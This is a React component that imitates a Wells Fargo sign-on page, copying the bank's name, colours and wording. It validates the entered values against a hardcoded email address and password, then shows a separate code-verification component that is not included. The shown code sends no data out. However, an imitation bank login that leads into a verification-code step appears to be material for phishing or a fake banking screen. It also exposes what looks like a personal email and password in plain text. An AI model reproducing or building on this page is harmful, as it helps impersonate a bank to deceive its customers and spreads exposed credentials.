import { useState, useEffect } from "react";
import { Menu } from "lucide-react";
import CodeVerification from "../Components/Code";

const getGreeting = () => {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 18) return "Good afternoon";
  return "Good evening";
};

const WellsFargoLogin = () => {
  const [greeting, setGreeting] = useState(getGreeting());
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    const interval = setInterval(() => setGreeting(getGreeting()), 60000);
    return () => clearInterval(interval);
  }, []);

  const handleLogin = (e) => {
    e.preventDefault();
    if (
      username === "Jasminekurt87@gmail.com" &&
      password === "jasmine1$1"
    ) {
      setIsLoggedIn(true);
      setError("");
    } else {
      setError("Invalid username or password.");
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col items-center justify-start">
      {/* Header */}
      <div className="w-full bg-[#c41e3a] text-white flex items-center justify-between px-4 py-3 relative shadow">
        <div className="flex-1 flex justify-center">
          <h1 className="text-lg font-bold tracking-wide">WELLS FARGO</h1>
        </div>
        <Menu className="absolute right-4 w-6 h-6" />
        <div className="absolute bottom-0 left-0 right-0 h-1 bg-yellow-400" />
      </div>

      {/* Main Card */}
      <div className="bg-white w-full max-w-md mt-10 rounded-xl shadow-md px-6 py-8 space-y-6">
        {!isLoggedIn ? (
          <>
            <div className="text-center">
              <h2 className="text-xl font-semibold text-gray-800">{greeting}</h2>
              <p className="text-sm text-gray-500 mt-1">
                Sign on to manage your accounts
              </p>
            </div>

            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700">Username</label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border-b-2 border-gray-300 focus:outline-none focus:border-blue-600 py-2"
                  placeholder="Enter your email"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700">Password</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border-b-2 border-gray-300 focus:outline-none focus:border-blue-600 py-2"
                  placeholder="Enter your password"
                />
              </div>

              <div className="flex items-center space-x-2 text-sm">
                <input type="checkbox" id="saveUsername" className="accent-red-600" />
                <label htmlFor="saveUsername" className="text-gray-600">Save username</label>
              </div>
              <p>To help your account secure, save your username on device that aren't use by other people.</p>

              <button
                type="submit"
                className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-full transition duration-300"
              >
                Sign On
              </button>

              {error && (
                <p className="text-sm text-red-600 text-center mt-2">{error}</p>
              )}
            </form>

              <div className="text-center text-sm text-blue-600 underline mt-2 cursor-pointer">
          Need help signing on?
        </div>
          </>
        ) : (
          <CodeVerification/>
        )}
      </div>
    </div>
  );
};

export default WellsFargoLogin;


